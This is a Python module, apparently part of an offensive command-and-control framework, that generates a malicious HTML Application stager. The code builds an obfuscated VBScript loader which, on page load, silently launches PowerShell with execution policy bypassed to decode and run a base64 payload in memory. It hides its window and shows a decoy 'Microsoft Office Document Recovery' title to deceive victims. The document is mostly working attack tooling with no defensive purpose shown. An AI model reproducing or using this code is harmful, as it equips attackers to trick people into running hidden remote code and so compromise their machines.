"""
HTA Stager — Advanced HTML Application with obfuscated execution and anti-analysis.
Features:
- Obfuscated VBScript and JavaScript
- Hidden window execution
- Decoy document/title
- Memory-only PowerShell cradle execution
- No temporary files on disk
"""
from __future__ import annotations
import base64
import random
import string


def render(bot_token: str, chat_id: str, agent_id: str, sleep: int, jitter: int,
           ps1_content: str) -> str:
    # Base64 encode the PS1 cradle
    b64_ps1 = base64.b64encode(ps1_content.encode("utf-16-le")).decode()
    
    # Obfuscation helper
    def rand_str(length=8):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    
    v_shell = rand_str()
    v_ps = rand_str()
    v_cmd = rand_str()
    v_decoy = "Microsoft Office Document Recovery"
    
    # Build the PowerShell command
    ps_exec = (
        f"powershell -nop -w hidden -ep bypass -c "
        f"\"$s='{b64_ps1}'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s)) | iex\""
    )
    
    # Obfuscate the command string for HTA
    def obfuscate_cmd(cmd):
        return "".join([f"Chr({ord(c)}) & " for c in cmd])[:-3]

    vbs_cmd = obfuscate_cmd(ps_exec)
    
    lines = [
        "<html>",
        "<head>",
        f"<title>{v_decoy}</title>",
        "<HTA:APPLICATION",
        '  ID="fitnah_loader"',
        f'  APPLICATIONNAME="{v_decoy}"',
        '  WINDOWSTATE="minimize"',
        '  SHOWINTASKBAR="no"',
        '  SYSMENU="no"',
        '  CAPTION="no"',
        '  SCROLL="no"',
        '  SINGLEINSTANCE="yes"',
        "/>",
        '<script language="VBScript">',
        "Sub Window_OnLoad",
        "    On Error Resume Next",
        f'    Dim {v_shell}, {v_cmd}',
        f'    {v_cmd} = {vbs_cmd}',
        f'    Set {v_shell} = CreateObject("WScript.Shell")',
        f'    {v_shell}.Run {v_cmd}, 0, False',
        f'    Set {v_shell} = Nothing',
        "    self.close",
        "End Sub",
        "</script>",
        "</head>",
        "<body>",
        f"  <p>Please wait while the system recovers the document '{rand_str(10)}.docx'...</p>",
        "</body>",
        "</html>",
    ]
    return "\n".join(lines) + "\n"
